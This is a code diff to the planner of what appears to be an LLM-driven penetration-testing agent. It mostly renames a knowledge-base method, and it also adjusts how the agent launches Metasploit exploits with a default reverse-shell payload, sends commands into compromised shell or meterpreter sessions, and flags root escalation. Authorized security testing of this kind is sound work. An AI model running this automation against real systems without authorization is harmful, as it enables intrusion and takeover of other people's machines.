@@ -350,7 +350,7 @@ class Planner:
                 # Auto-add NSE script findings into KB
                 if self._kb:
                     for f in get_notable_script_findings(parsed):
-                        self._kb.add_dict(f)
+                        self._kb.add_from_dict(f)
 
                 port_count = len(fields.get("open_ports", []))
                 return (
@@ -381,7 +381,7 @@ class Planner:
 
                 if self._kb:
                     for f in parsed.get("auto_findings", []):
-                        self._kb.add_dict(f)
+                        self._kb.add_from_dict(f)
 
                 return (
                     f"Found {len(paths)} paths. "
@@ -405,7 +405,7 @@ class Planner:
                 findings = parse_searchsploit_json(result.stdout)
                 if self._kb:
                     for f in findings:
-                        self._kb.add_dict(f)
+                        self._kb.add_from_dict(f)
                 return (
                     f"searchsploit '{query}': {len(findings)} results. "
                     + (
@@ -468,6 +468,11 @@ class Planner:
             if not module_path:
                 return "msf_exploit skipped — missing required 'module' path"
 
+            # LLM may provide "exploit/unix/..." while pymetasploit expects
+            # type + path separately. Normalize to bare module path.
+            if module_path.startswith("exploit/"):
+                module_path = module_path[len("exploit/"):]
+
             exploit = self._msf.modules.use("exploit", module_path)
             for k, v in options.items():
                 exploit[k] = v
@@ -477,12 +482,13 @@ class Planner:
             if options.get("LHOST"):
                 exploit["LHOST"] = options["LHOST"]
 
-            payload = self._msf.modules.use(
-                "payload",
-                args.get("payload", "generic/shell_reverse_tcp"),
-            )
+            payload_name = args.get("payload", "generic/shell_reverse_tcp")
+            if payload_name.startswith("payload/"):
+                payload_name = payload_name[len("payload/"):]
+            if payload_name:
+                exploit["PAYLOAD"] = payload_name
             existing_sessions = set(self._msf.sessions.list.keys())
-            result = exploit.execute(payload=payload)
+            result = exploit.execute()
 
             # Poll briefly for a new session so async exploit jobs don't look "silent".
             elapsed = 0.0
@@ -534,7 +540,16 @@ class Planner:
 
         try:
             session = self._msf.sessions.session(str(session_id))
-            result  = session.run_with_output(cmd, timeout=30)
+            session_type = self._msf.sessions.list.get(
+                str(session_id), {}
+            ).get("type", "shell")
+
+            if session_type == "meterpreter":
+                result = session.run_with_output(cmd, timeout=30)
+            else:
+                session.write(cmd + "\n")
+                time.sleep(2)
+                result = session.read()
             output  = result.strip()
 
             # Auto-detect root escalation
@@ -580,7 +595,7 @@ class Planner:
             findings = _parse_linpeas_output(output)
             if self._kb:
                 for f in findings:
-                    self._kb.add_dict(f)
+                    self._kb.add_from_dict(f)
 
             lines = [l for l in output.splitlines() if l.strip()]
             return (
@@ -612,7 +627,7 @@ class Planner:
         }
 
         if self._kb:
-            self._kb.add_dict(finding)
+            self._kb.add_from_dict(finding)
         else:
             self._state.add_finding(finding)
 
